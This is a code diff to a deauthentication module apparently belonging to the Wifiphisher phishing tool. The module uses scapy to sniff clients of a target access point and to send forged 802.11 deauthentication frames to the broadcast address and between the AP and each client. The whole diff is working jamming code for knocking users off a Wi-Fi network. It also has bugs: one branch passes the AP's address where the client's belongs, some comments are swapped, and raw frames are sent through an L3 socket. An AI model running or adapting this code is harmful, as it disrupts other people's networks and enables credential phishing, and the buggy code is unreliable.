@@ -1,15 +1,19 @@
 """
-This module handles all the deauthentication required for Wifiphisher.
+Sends 3 DEAUTH Frames:
+ 1 from the AP to the client
+ 1 from the client to the AP
+ 1 to the broadcast address
 """
 
 import threading
 import scapy.layers.dot11 as dot11
-import scapy.sendrecv
+from scapy.all import *
+from constants import *
 
 
 class Deauthentication(object):
     """
-    This class handles all the deauthentication process.
+    Handles all the deauthentication process.
     """
 
     def __init__(self, ap_bssid, jamming_interface):
@@ -17,7 +21,7 @@ class Deauthentication(object):
         Setup the class with all the given arguments.
 
         :param self: A Deauthentication object.
-        :param ap_bssid: The MAC address of the selected acess point.
+        :param ap_bssid: The MAC address of the selected access point.
         :param jamming_interface: The interface to be used for jamming.
         :type self: Deauthentication
         :type ap_bssid: string
@@ -27,9 +31,85 @@ class Deauthentication(object):
         """
 
         self._observed_clients = list()
+        self._pkts = list()
+        self._ignore_bssids = list()
         self._ap_bssid = ap_bssid
         self._should_continue = True
         self._jamming_interface = jamming_interface
+        self.socket = conf.L3socket(iface=self._jamming_interface)
+        # Craft DEAUTH frame to broadcast address
+        self._craft_broadcast_deauth()
+        # Populate the ignore list
+        self._populate_ignore()
+
+    def _populate_ignore(self):
+        """
+        Populates BSSID ignore list.
+
+        :param self: A Deauthentication object.
+        :type self: Deauthentication
+        :return: None
+        :rtype: None
+        """
+ 
+        self._ignore_bssids.append(WIFI_BROADCAST)
+        self._ignore_bssids.append(WIFI_INVALID)
+        self._ignore_bssids.append(WIFI_IPV6MCAST1)
+        self._ignore_bssids.append(WIFI_IPV6MCAST2)
+        self._ignore_bssids.append(WIFI_SPANNINGTREE)
+        self._ignore_bssids.append(WIFI_MULTICAST)
+        self._ignore_bssids.append(self._ap_bssid)
+
+    def _craft_broadcast_deauth(self):
+        """
+        Crafts one DEAUTH frame to the broadcast address.
+
+        :param self: A Deauthentication object.
+        :type self: Deauthentication
+        :return: None
+        :rtype: None
+        """
+        packet = dot11.Dot11(
+                      type=0, subtype=12,
+                      addr1=WIFI_BROADCAST,
+                      addr2=self._ap_bssid,
+                      addr3=self._ap_bssid) / \
+                dot11.Dot11Deauth()
+
+        self._pkts.append(packet)
+
+
+    def _craft_client_deauth(self, client_bssid):
+        """
+        Crafts two DEAUTH frames: 1 from the AP to the client 
+        and 1 from the client to the AP.
+
+        :param self: A Deauthentication object.
+        :param client_bssid: The MAC address of the selected acess point.
+        :type self: Deauthentication
+        :type packet: string
+        :return: None
+        :rtype: None
+        """
+
+        packet = dot11.Dot11(
+                      type=0, subtype=12,
+                      addr1=self._ap_bssid,
+                      addr2=client_bssid,
+                      addr3=client_bssid) / \
+                dot11.Dot11Deauth()
+
+        self._pkts.append(packet)
+
+        packet = dot11.Dot11(
+                      type=0, subtype=12,
+                      addr1=client_bssid,
+                      addr2=self._ap_bssid,
+                      addr3=self._ap_bssid) / \
+                dot11.Dot11Deauth()
+
+        self._pkts.append(packet)
+
 
     def process_packet(self, packet):
         """
@@ -47,9 +127,6 @@ class Deauthentication(object):
                  access point as they respond to the access point probes.
         """
 
-        # broadcast address that all devices would respond to
-        broadcast_address = "ff:ff:ff:ff:ff:ff"
-
         # check if the packet has a dot11 layer
         if packet.haslayer(dot11.Dot11):
             # check if the packet has either control = 0, management = 1
@@ -57,15 +134,21 @@ class Deauthentication(object):
             if packet.type in [0, 1, 2]:
                 # check if client is new and connected to target access point
                 if (packet.addr1 == self._ap_bssid and
+                        packet.addr2 not in self._ignore_bssids and
                         packet.addr2 not in self._observed_clients and
                         packet.addr2 is not None):
-                    # add new client to the list
+                    # craft deauth frame from the new client
                     self._observed_clients.append(packet.addr2)
-                elif (packet.addr2 == self._ap_bssid and
-                      packet.addr1 != broadcast_address and
-                      packet.addr1 not in self._observed_clients):
                     # add new client to the list
+                    self._craft_client_deauth(packet.addr2)
+                elif (packet.addr2 == self._ap_bssid and
+                      packet.addr1 not in self._ignore_bssids and
+                      packet.addr1 not in self._observed_clients and
+                      packet.addr1 is not None):
+                    # craft deauth frame from the new client
                     self._observed_clients.append(packet.addr1)
+                    # add new client to the list
+                    self._craft_client_deauth(packet.addr2)
 
     def find_clients(self):
         """
@@ -77,7 +160,7 @@ class Deauthentication(object):
         :rtype: None
         """
 
-        # continue to find clients until otherwise told
+        # continue to find clients until told otherwise
         while self._should_continue:
             dot11.sniff(iface=self._jamming_interface, prn=self.process_packet,
                         count=1, store=0)
@@ -120,20 +203,10 @@ class Deauthentication(object):
 
         """
 
-        # continue to deauthenticate until otherwise set
         while self._should_continue:
-            # added to reduce the stress on system and allow user to connect
             if self._observed_clients:
-                for client in self._observed_clients:
-
-                    packet = (dot11.RadioTap() /
-                              dot11.Dot11(type=0, subtype=12,
-                                          addr1=client,
-                                          addr2=self._ap_bssid,
-                                          addr3=self._ap_bssid) /
-                              dot11.Dot11Deauth())
-
-                    scapy.sendrecv.sendp(packet, count=1, verbose=False)
+                for p in self._pkts:
+                    self.socket.send(p)
 
     def deauthenticate(self):
         """
